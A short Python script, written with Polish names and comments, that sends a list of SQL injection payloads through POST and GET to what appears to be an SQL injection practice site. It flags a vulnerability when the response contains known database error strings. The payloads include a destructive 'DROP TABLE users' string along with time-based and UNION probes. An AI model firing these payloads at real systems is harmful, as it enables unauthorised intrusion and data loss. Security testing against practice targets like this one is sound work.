import urllib.request
import urllib.parse
import urllib.error

# Typowe payloady SQL Injection
SQL_PAYLOADY = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "'; DROP TABLE users; --",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "' or sleep(5)--",
    "' UNION SELECT null, version()--"
]

# Typowe komunikaty błędów SQL
BLEDY_SQL = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlite error",
    "pg_query():",
    "mysql_fetch",
    "ORA-01756"
]

# Adres URL do testów
TESTOWANY_URL = "https://ashkiani.github.io/sql-injection-playground/"

# Szablon danych POST
DANE_POST = {
    "username": "",
    "password": "test"
}

def wykonaj_test_post(url, dane_szablonowe, payloady):
    """Testowanie SQL Injection metodą POST"""
    for payload in payloady:
        dane = dane_szablonowe.copy()
        dane["username"] = payload
        print(f"\nTestowanie (POST): {payload}")

        try:
            zaszyfrowane_dane = urllib.parse.urlencode(dane).encode("utf-8")
            req = urllib.request.Request(
                url,
                data=zaszyfrowane_dane,
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )
            with urllib.request.urlopen(req, timeout=5) as response:
                if czy_podatny(response):
                    print("Znaleziono podatność!")
                else:
                    print("Brak podatności.")
        except urllib.error.URLError as blad:
            print(f"Błąd połączenia: {blad}")

def wykonaj_test_get(url, nazwa_parametru, payloady):
    """Testowanie SQL Injection metodą GET"""
    for payload in payloady:
        print(f"\nTestowanie (GET): {payload}")
        parametry = {nazwa_parametru: payload}
        pelny_url = f"{url}?{urllib.parse.urlencode(parametry)}"

        try:
            req = urllib.request.Request(pelny_url)
            with urllib.request.urlopen(req, timeout=5) as response:
                if czy_podatny(response):
                    print("Znaleziono podatność!")
                else:
                    print("Brak podatności.")
        except urllib.error.URLError as blad:
            print(f"Błąd połączenia: {blad}")

def czy_podatny(odpowiedz):
    """Sprawdzanie obecności znanych błędów SQL w odpowiedzi"""
    tresc = odpowiedz.read().decode('utf-8', errors='ignore').lower()
    return any(blad in tresc for blad in BLEDY_SQL)

if __name__ == "__main__":
    print("=== Testy SQL Injection - POST ===")
    wykonaj_test_post(TESTOWANY_URL, DANE_POST, SQL_PAYLOADY)

    print("\n=== Testy SQL Injection - GET ===")
    wykonaj_test_get(TESTOWANY_URL, "username", SQL_PAYLOADY)
